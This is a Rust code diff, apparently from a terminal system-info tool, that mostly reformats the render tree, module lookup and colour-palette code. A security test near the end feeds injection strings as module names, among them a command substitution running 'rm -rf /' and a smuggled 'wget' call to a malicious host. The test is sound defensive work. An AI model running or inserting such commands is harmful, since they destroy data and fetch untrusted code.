@@ -16,19 +16,38 @@ const ANSI_COLORS: [u8; 8] = [0, 1, 2, 3, 4, 5, 6, 7];
 
 #[derive(Debug)]
 pub enum RenderNode {
-    Line { key: String, value: String, icon: String },
-    Group { title: String, children: Vec<RenderNode> },
+    Line {
+        key: String,
+        value: String,
+        icon: String,
+    },
+    Group {
+        title: String,
+        children: Vec<RenderNode>,
+    },
 }
 
-pub fn prepare_render_tree(info: &Info, modules: &[ModuleConfig], config: &Config) -> Vec<RenderNode> {
+pub fn prepare_render_tree(
+    info: &Info,
+    modules: &[ModuleConfig],
+    config: &Config,
+) -> Vec<RenderNode> {
     let mut nodes = Vec::new();
     for module in modules {
         match module {
             ModuleConfig::Simple(key) => {
                 if key == PALETTE_KEY {
                     let val = format_palette(config);
-                    let icon = config.icons.get(key).cloned().unwrap_or_else(|| DEFAULT_PALETTE_ICON.to_string());
-                    nodes.push(RenderNode::Line { key: key.clone(), value: val, icon });
+                    let icon = config
+                        .icons
+                        .get(key)
+                        .cloned()
+                        .unwrap_or_else(|| DEFAULT_PALETTE_ICON.to_string());
+                    nodes.push(RenderNode::Line {
+                        key: key.clone(),
+                        value: val,
+                        icon,
+                    });
                 } else if key.starts_with("plugin:") {
                     if let Some(lines) = info.plugin_info.get(key) {
                         for line in lines {
@@ -42,22 +61,32 @@ pub fn prepare_render_tree(info: &Info, modules: &[ModuleConfig], config: &Confi
                 } else {
                     let val = get_module_value(info, key);
                     if let Some(v) = val {
-                        let icon = config.icons.get(key).cloned().unwrap_or_else(|| DEFAULT_MODULE_ICON.to_string());
-                        nodes.push(RenderNode::Line { key: key.clone(), value: v, icon });
+                        let icon = config
+                            .icons
+                            .get(key)
+                            .cloned()
+                            .unwrap_or_else(|| DEFAULT_MODULE_ICON.to_string());
+                        nodes.push(RenderNode::Line {
+                            key: key.clone(),
+                            value: v,
+                            icon,
+                        });
                     }
                 }
-            },
+            }
             ModuleConfig::Group { title, modules } => {
                 let children = prepare_render_tree(info, modules, config);
                 if !children.is_empty() {
-                    nodes.push(RenderNode::Group { title: title.clone(), children });
+                    nodes.push(RenderNode::Group {
+                        title: title.clone(),
+                        children,
+                    });
                 }
             }
         }
     }
     nodes
 }
-
 
 fn get_module_value(info: &Info, key: &str) -> Option<String> {
     match key {
@@ -69,15 +98,21 @@ fn get_module_value(info: &Info, key: &str) -> Option<String> {
         "shell" => Some(info.shell.clone()),
         "cpu" => Some(info.cpu.clone()),
         "gpu" => {
-            if info.gpu.is_empty() { Some(UNKNOWN_FALLBACK.to_string()) }
-            else { Some(info.gpu.join(" / ")) }
-        },
+            if info.gpu.is_empty() {
+                Some(UNKNOWN_FALLBACK.to_string())
+            } else {
+                Some(info.gpu.join(" / "))
+            }
+        }
         "memory" => Some(info.memory.clone()),
         "swap" => Some(info.swap.clone()),
         "disk" => {
-             if info.disks.is_empty() { Some(UNKNOWN_FALLBACK.to_string()) }
-             else { Some(info.disks[0].clone()) }
-        },
+            if info.disks.is_empty() {
+                Some(UNKNOWN_FALLBACK.to_string())
+            } else {
+                Some(info.disks[0].clone())
+            }
+        }
         "battery" => Some(info.battery.clone()),
         "uptime" => Some(info.uptime.clone()),
         "terminal" => Some(info.terminal.clone()),
@@ -100,31 +135,30 @@ fn format_palette(config: &Config) -> String {
             for c in ANSI_COLORS {
                 s.push_str(&format!("\x1b[{}m  \x1b[0m ", c + 40));
             }
-        },
+        }
         CIRCLES_STYLE => {
             for c in ANSI_COLORS {
                 s.push_str(&format!("\x1b[{}m●\x1b[0m ", c + 30));
             }
-        },
+        }
         TRIANGLES_STYLE => {
             for c in ANSI_COLORS {
                 s.push_str(&format!("\x1b[{}m▲\x1b[0m ", c + 30));
             }
-        },
+        }
         LINES_STYLE => {
             for c in ANSI_COLORS {
                 s.push_str(&format!("\x1b[{}m███\x1b[0m", c + 30));
             }
-        },
+        }
         _ => {
-             for c in ANSI_COLORS {
+            for c in ANSI_COLORS {
                 s.push_str(&format!("\x1b[{}m  \x1b[0m ", c + 40));
             }
         }
     }
     s
 }
-
 
 //tests
 #[cfg(test)]
@@ -138,7 +172,7 @@ mod tests {
         let config = Config::default();
         let info = Info::with_config(&config);
         let modules = vec![];
-        
+
         let nodes = prepare_render_tree(&info, &modules, &config);
         assert!(nodes.is_empty());
     }
@@ -147,7 +181,7 @@ mod tests {
     fn test_security_malicious_module_injection() {
         let config = Config::default();
         let info = Info::with_config(&config);
-        
+
         // Cybersec: test malicious module injection
         let malicious_modules = vec![
             ModuleConfig::Simple("$(rm -rf /)".to_string()),
@@ -155,9 +189,9 @@ mod tests {
             ModuleConfig::Simple("os_name; wget http://malicious.com".to_string()),
             ModuleConfig::Simple("A".repeat(10_000)), // Test against overflows
         ];
-        
+
         let nodes = prepare_render_tree(&info, &malicious_modules, &config);
-        
+
         assert!(nodes.len() <= malicious_modules.len());
     }
 }
